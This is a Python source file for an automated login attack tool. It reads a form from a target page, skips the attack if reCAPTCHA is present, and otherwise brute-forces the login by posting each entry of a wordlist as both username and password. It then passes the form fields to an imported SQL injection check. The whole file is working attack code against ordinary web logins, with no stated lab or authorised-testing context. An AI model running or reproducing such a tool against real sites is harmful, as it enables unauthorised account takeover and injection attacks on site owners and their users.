import requests
from bs4 import BeautifulSoup
from colorama import Fore
from SQLi import sqli_check


class Login_bruteforce:

    def __init__(self, url, host):
        self.url = url
        self.host = host
        self.login_url = None
        self.username_input = None
        self.password_input = None
        self.headers = {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET',
            'Access-Control-Allow-Headers': 'Content-Type',
            'Access-Control-Max-Age': '3600',
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
        }
        self.req = requests.get(url, self.headers, allow_redirects=True)
        self.soup = BeautifulSoup(self.req.content, 'html.parser')

    def login_func(self):
        names = []
        Login = True
        with open('bruteforce.txt') as my_file:
            for line in my_file:
                names.append(line.rstrip('\n'))
            for i in names:
                response = requests.post(self.login_url, data={self.username_input: i, self.password_input: i})
                if "Logout" in response.text or "logout" in response.text:
                    Login = True
                    break
                else:
                    Login = False
        if Login == True:
            print(Fore.WHITE + "\n******************************************************")
            print(Fore.RED + "Login with {}:{} is success. Please double check this can be false positive...! ".format(i,i) + "\N{grinning face}")
            print(Fore.WHITE + "\n******************************************************")
        else:
            print(Fore.WHITE + "Bruteforce Failed")
            print(Fore.WHITE + "\n******************************************************")

    def obtain_form_tags(self):
        form = self.soup.find("form")
        action = self.soup.find("form").get("action")  # Obtaining Action URL
        if action != "":
            action = "/" + action
            self.login_url = self.host + action
        else:
            self.login_url = self.url

        inputs = form.find_all("input")
        for input_element in inputs:
            if input_element.get("type") == "text":
                self.username_input = input_element.get("name")
            elif input_element.get("type") == "password":
                self.password_input = input_element.get("name")

        if self.password_input is None or self.username_input is None:
            print(Fore.WHITE + "No Valid Username password tag name found")
            exit()
        else:
            self.login_func()
        sqli_check(self.username_input, self.password_input, self.login_url)

    def Captcha_check(self):
        if "recaptcha".casefold() in self.req.text:  # Check for recaptcha
            print(Fore.WHITE + "\n******************************************************")  # In case of redirect
            print(Fore.WHITE + "ReCaptcha Found, can't bruteforce" + "\U0001F612")
            sqli_check(self.username_input, self.password_input, self.login_url)
            exit()
        else:
            print(Fore.WHITE + "\n******************************************************")  # In case of redirect
            print(Fore.BLUE + "No Captcha seems to be implemented. Moving towards the bruteforce...!" + "\N{grinning face}")
            self.obtain_form_tags()
